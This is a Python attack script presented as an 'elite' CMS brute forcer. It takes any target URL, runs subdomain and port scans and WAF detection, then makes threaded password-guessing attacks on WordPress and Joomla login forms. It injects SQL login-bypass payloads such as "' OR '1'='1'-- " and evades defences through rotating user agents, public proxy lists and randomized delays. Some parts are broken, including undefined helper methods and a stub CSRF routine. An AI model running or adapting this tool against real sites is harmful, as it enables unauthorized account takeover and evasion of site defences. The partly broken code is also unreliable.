#!/usr/bin/env python3
"""
ğŸ¦… ELITE CMS BRUTE FORCER - REDAX SPECIAL FORCES ğŸ¦…
Created by Redax - For National Cyber Security Research
"""

import requests
import threading
import time
import sys
import os
import random
import hashlib
import base64
import json
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
import dns.resolver
import socket
import ssl
from datetime import datetime

class EliteBruteForcer:
    def __init__(self):
        self.banner()
        self.session = requests.Session()
        self.found_credentials = []
        self.attempts = 0
        self.proxies = []
        self.current_proxy = None
        self.lock = threading.Lock()
        self.ua = UserAgent()
        self.start_time = time.time()
        
        # Military-grade wordlists
        self.wordlist_urls = {
            'usernames': "https://raw.githubusercontent.com/jeanphorn/wordlist/master/usernames.txt",
            'passwords': "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt",
            'proxies': "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            'subdomains': "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt"
        }
        
        # Advanced CMS Detection
        self.cms_signatures = {
            'wordpress': {
                'login_urls': ['/wp-login.php', '/wp-admin', '/login'],
                'indicators': ['wp-content', 'wp-includes', 'wordpress'],
                'form_fields': {'log': 'username', 'pwd': 'password', 'wp-submit': 'Log In'},
                'success': ['wp-admin', 'dashboard', 'profile.php']
            },
            'joomla': {
                'login_urls': ['/administrator', '/admin'],
                'indicators': ['joomla', 'com_login', 'mod_login'],
                'form_fields': {'username': 'username', 'passwd': 'password', 'submit': 'Log in'},
                'success': ['administrator', 'control panel', 'joomla']
            },
            # ... tambahkan lainnya yang sama
        }
        
        # Advanced payloads
        self.sql_payloads = [
            "' OR '1'='1'-- ",
            "' OR 1=1-- ",
            "admin'--",
            "' OR 'a'='a",
            "') OR ('1'='1'--",
        ]
        
        self.headers_pool = self.generate_headers_pool()

    def banner(self):
        print(r"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                                      â•‘
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—  â•‘
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•  â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•      â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—  â•‘
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘  â•‘
â•‘  â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•   â•šâ•â•â•â•â•â•â•    â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•  â•‘
â•‘                                                                      â•‘
â•‘                  ELITE CMS BRUTE FORCER - REDA                   â•‘
â•‘               For National Cyber Security Research Only             â•‘
â•‘                                                                      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)

    def generate_headers_pool(self):
        """Generate random headers untuk evasion"""
        return [
            {
                'User-Agent': self.ua.random,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            },
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
                'Cache-Control': 'no-cache',
            },
            {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
            }
        ]

    def get_random_headers(self):
        return random.choice(self.headers_pool)

    def advanced_recon(self, target_url):
        """Advanced reconnaissance"""
        print(f"\n[ğŸ›°ï¸] Starting Advanced Reconnaissance...")
        
        domain = urlparse(target_url).netloc
        results = {
            'subdomains': [],
            'ports': [],
            'tech_stack': [],
            'waf_detected': False
        }
        
        # Subdomain enumeration
        try:
            subdomains = self.enumerate_subdomains(domain)
            results['subdomains'] = subdomains
            print(f"[+] Found {len(subdomains)} subdomains")
        except Exception as e:
            print(f"[-] Subdomain enum failed: {e}")
        
        # Port scanning
        try:
            open_ports = self.quick_port_scan(domain)
            results['ports'] = open_ports
            print(f"[+] Found {len(open_ports)} open ports")
        except Exception as e:
            print(f"[-] Port scan failed: {e}")
        
        # WAF Detection
        try:
            waf = self.detect_waf(target_url)
            results['waf_detected'] = waf
            print(f"[+] WAF Detected: {waf}")
        except Exception as e:
            print(f"[-] WAF detection failed: {e}")
        
        return results

    def enumerate_subdomains(self, domain):
        """Enumerate subdomains"""
        subdomains = []
        try:
            wordlist = self.load_wordlist('subdomains.txt')
            for sub in random.sample(wordlist, min(50, len(wordlist))):
                test_domain = f"{sub}.{domain}"
                try:
                    socket.gethostbyname(test_domain)
                    subdomains.append(test_domain)
                except:
                    continue
        except:
            # Fallback to common subdomains
            common_subs = ['www', 'mail', 'ftp', 'localhost', 'admin', 'blog', 'api']
            for sub in common_subs:
                test_domain = f"{sub}.{domain}"
                try:
                    socket.gethostbyname(test_domain)
                    subdomains.append(test_domain)
                except:
                    continue
        return subdomains

    def quick_port_scan(self, domain):
        """Quick port scan"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 2082, 2083, 2086, 2087, 2095, 2096, 3306, 8080]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((domain, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports

    def detect_waf(self, target_url):
        """Detect WAF presence"""
        try:
            response = requests.get(target_url, timeout=5)
            headers = str(response.headers).lower()
            
            waf_indicators = [
                'cloudflare', 'incapsula', 'sucuri', 'wordfence',
                'akamai', 'barracuda', 'fortinet', 'imperva'
            ]
            
            for waf in waf_indicators:
                if waf in headers or waf in response.text.lower():
                    return waf
            return "Not Detected"
        except:
            return "Unknown"

    def smart_credential_generation(self, domain):
        """Generate smart credentials based on target"""
        base_domain = domain.split('.')[0]
        
        smart_creds = {
            'usernames': [
                'admin', 'administrator', 'root', base_domain, 
                f'admin@{domain}', 'webmaster', 'test', 'demo',
                'info', 'contact', 'support', 'service'
            ],
            'passwords': [
                'admin', 'password', '123456', f'{base_domain}123',
                f'Admin@{datetime.now().year}', 'P@ssw0rd', '12345678',
                'admin123', 'password123', 'Welcome123', 'Changeme123'
            ] + self.sql_payloads
        }
        return smart_creds

    def advanced_brute_force(self, target_url, cms_type, login_url, usernames, passwords, max_threads=20):
        """Advanced brute force dengan multiple techniques"""
        print(f"\n[ğŸ”¥] Starting ELITE Brute Force Attack...")
        print(f"[ğŸ¯] Target: {target_url}")
        print(f"[ğŸ›¡ï¸] CMS: {cms_type.upper()}")
        print(f"[ğŸ‘¥] Usernames: {len(usernames)}")
        print(f"[ğŸ”‘] Passwords: {len(passwords)}")
        print(f"[âš¡] Threads: {max_threads}")
        
        attack_modes = ['normal', 'sql_injection', 'bypass_attempts']
        
        for mode in attack_modes:
            if self.found_credentials:
                break
                
            print(f"\n[ğŸš€] Trying {mode.upper()} mode...")
            self.multi_technique_attack(target_url, cms_type, login_url, usernames, passwords, mode, max_threads)
            
            # Random delay antara mode
            time.sleep(random.uniform(2, 5))

    def multi_technique_attack(self, target_url, cms_type, login_url, usernames, passwords, mode, max_threads):
        """Multi-technique attack"""
        credentials_to_try = []
        
        for username in usernames[:50]:  # Limit untuk demo
            for password in passwords[:100]:
                if mode == 'sql_injection':
                    # Coba SQL injection sebagai password
                    credentials_to_try.append((username, random.choice(self.sql_payloads)))
                elif mode == 'bypass_attempts':
                    # Coba bypass dengan variasi
                    credentials_to_try.append((username, f"{password}' OR '1'='1"))
                else:
                    credentials_to_try.append((username, password))
        
        # Shuffle credentials
        random.shuffle(credentials_to_try)
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            
            for username, password in credentials_to_try:
                if len(self.found_credentials) >= 3:
                    break
                    
                future = executor.submit(
                    self.elite_login_attempt, target_url, cms_type, login_url, username, password, mode
                )
                futures.append(future)
                
                # Advanced rate limiting dengan jitter
                time.sleep(random.uniform(0.01, 0.1))
            
            # Monitor progress
            for future in as_completed(futures):
                if len(self.found_credentials) >= 3:
                    executor.shutdown(wait=False)
                    break

    def elite_login_attempt(self, target_url, cms_type, login_url, username, password, mode):
        """Elite login attempt dengan evasion techniques"""
        try:
            # Random headers setiap request
            headers = self.get_random_headers()
            
            # Proxy rotation
            proxies = None
            if self.proxies:
                proxy = random.choice(self.proxies)
                proxies = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
            
            # Get CSRF token dengan session yang sama
            csrf_token = self.get_advanced_csrf(login_url, cms_type)
            
            # Prepare form data
            form_data = self.prepare_form_data(cms_type, username, password, csrf_token, mode)
            
            # Random delay
            time.sleep(random.uniform(0.1, 0.5))
            
            response = self.session.post(
                login_url,
                data=form_data,
                headers=headers,
                proxies=proxies,
                timeout=15,
                allow_redirects=True,
                verify=False  # Skip SSL verification untuk testing
            )
            
            with self.lock:
                self.attempts += 1
                if self.attempts % 25 == 0:
                    elapsed = time.time() - self.start_time
                    speed = self.attempts / elapsed
                    print(f"[ğŸ“Š] Attempts: {self.attempts} | Speed: {speed:.2f}/sec | Mode: {mode}")
            
            # Advanced success detection
            if self.detect_login_success(response, cms_type):
                print(f"\n[ğŸ’¥ ELITE SUCCESS] {username}:{password} | Mode: {mode}")
                self.found_credentials.append((username, password, cms_type, mode))
                return True
                
        except Exception as e:
            pass
        
        return False

    def get_advanced_csrf(self, login_url, cms_type):
        """Advanced CSRF token extraction"""
        try:
            response = self.session.get(login_url, headers=self.get_random_headers(), timeout=10)
            
            # Multiple extraction methods
            token_patterns = [
                ('input', {'name': ['csrf_token', '_token', 'csrf', 'authenticity_token']}),
                ('meta', {'name': ['csrf-token', 'csrf-token']}),
                ('input', {'name': ['_wpnonce', 'nonce']}),  # WordPress
            ]
            
            for tag, attributes in token_patterns:
                if 'name' in attributes:
                    for name_pattern in attributes['name']:
                        # Implement extraction logic
                        pass
            
            return "bypass_token"
        except:
            return "bypass_token"

    def prepare_form_data(self, cms_type, username, password, csrf_token, mode):
        """Prepare form data dengan variasi"""
        base_data = self.cms_signatures[cms_type]['form_fields'].copy()
        
        # Fill dengan variasi berdasarkan mode
        for field, value in base_data.items():
            if value == 'username':
                if mode == 'sql_injection':
                    base_data[field] = f"{username}' OR '1'='1'-- "
                else:
                    base_data[field] = username
            elif value == 'password':
                if mode == 'bypass_attempts':
                    base_data[field] = f"{password}' OR '1'='1"
                else:
                    base_data[field] = password
            elif value == 'csrf':
                base_data[field] = csrf_token
        
        return base_data

    def detect_login_success(self, response, cms_type):
        """Advanced login success detection"""
        content_lower = response.text.lower()
        current_url = response.url.lower()
        
        success_indicators = [
            'logout', 'dashboard', 'admin', 'welcome',
            'my account', 'profile', 'success', 'redirecting'
        ]
        
        failure_indicators = [
            'invalid', 'error', 'failed', 'incorrect',
            'login failed', 'access denied'
        ]
        
        # Check success indicators
        success_score = sum(1 for indicator in success_indicators if indicator in content_lower)
        failure_score = sum(1 for indicator in failure_indicators if indicator in content_lower)
        
        # Additional checks
        if response.status_code in [302, 301] and 'login' not in current_url:
            success_score += 2
        
        if any(indicator in current_url for indicator in self.cms_signatures[cms_type]['success']):
            success_score += 2
        
        return success_score > failure_score

    def generate_report(self):
        """Generate elite penetration test report"""
        report = f"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                   ELITE PENETRATION TEST REPORT              â•‘
â•‘                         Created by Redax SF                 â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ“… Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
ğŸ¯ Total Attempts: {self.attempts}
â±ï¸ Scan Duration: {time.time() - self.start_time:.2f} seconds
ğŸ“ˆ Attack Speed: {self.attempts/(time.time() - self.start_time):.2f} attempts/sec

ğŸ”“ COMPROMISED CREDENTIALS:
"""
        
        for i, (user, pwd, cms, mode) in enumerate(self.found_credentials, 1):
            report += f"""
   {i}. Username: {user}
      Password: {pwd}
      CMS Type: {cms.upper()}
      Method: {mode.upper()}
      Security Level: âŒ CRITICAL
"""
        
        report += """
âš ï¸ SECURITY RECOMMENDATIONS:
   1. Implement WAF (Web Application Firewall)
   2. Enable Rate Limiting on Login Endpoints
   3. Use Multi-Factor Authentication (MFA)
   4. Monitor for Brute Force Attempts
   5. Regular Security Audits

ğŸ” IMMEDIATE ACTIONS REQUIRED:
   â€¢ Change all compromised passwords
   â€¢ Review access logs for suspicious activity
   â€¢ Update CMS and plugins to latest versions
   â€¢ Implement account lockout policies
"""
        
        print(report)
        
        # Save report to file
        filename = f"pentest_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(report)
        print(f"[+] Full report saved to: {filename}")

    def run_elite_attack(self):
        """Main elite attack function"""
        try:
            target_url = input("[?] Enter target URL: ").strip()
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'http://' + target_url
            
            print(f"\n[ğŸ¯] Target locked: {target_url}")
            
            # Advanced Recon
            recon_data = self.advanced_recon(target_url)
            
            # Auto CMS Detection
            cms_type, login_url = self.detect_cms(target_url)
            if not cms_type:
                cms_type = 'generic'
                login_url = urljoin(target_url, '/admin')
            
            # Smart Credential Generation
            domain = urlparse(target_url).netloc
            smart_creds = self.smart_credential_generation(domain)
            
            # Load additional wordlists
            usernames = smart_creds['usernames']
            passwords = smart_creds['passwords']
            
            # Add wordlist credentials
            try:
                additional_users = self.load_wordlist('usernames.txt')[:50]
                additional_passwords = self.load_wordlist('passwords.txt')[:100]
                usernames.extend(additional_users)
                passwords.extend(additional_passwords)
            except:
                pass
            
            # Remove duplicates
            usernames = list(set(usernames))
            passwords = list(set(passwords))
            
            print(f"[ğŸ‘¥] Final Username List: {len(usernames)}")
            print(f"[ğŸ”‘] Final Password List: {len(passwords)}")
            
            # Elite Brute Force
            self.advanced_brute_force(target_url, cms_type, login_url, usernames, passwords, max_threads=15)
            
            # Generate Report
            self.generate_report()
            
        except KeyboardInterrupt:
            print("\n[!] Elite operation interrupted")
            self.generate_report()
        except Exception as e:
            print(f"[-] Elite operation failed: {e}")
            self.generate_report()

# Additional helper methods would be here...

if __name__ == "__main__":
    try:
        elite = EliteBruteForcer()
        elite.run_elite_attack()
    except KeyboardInterrupt:
        print("\n[!] Mission aborted by operator")
    except Exception as e:
        print(f"[-] Fatal mission failure: {e}")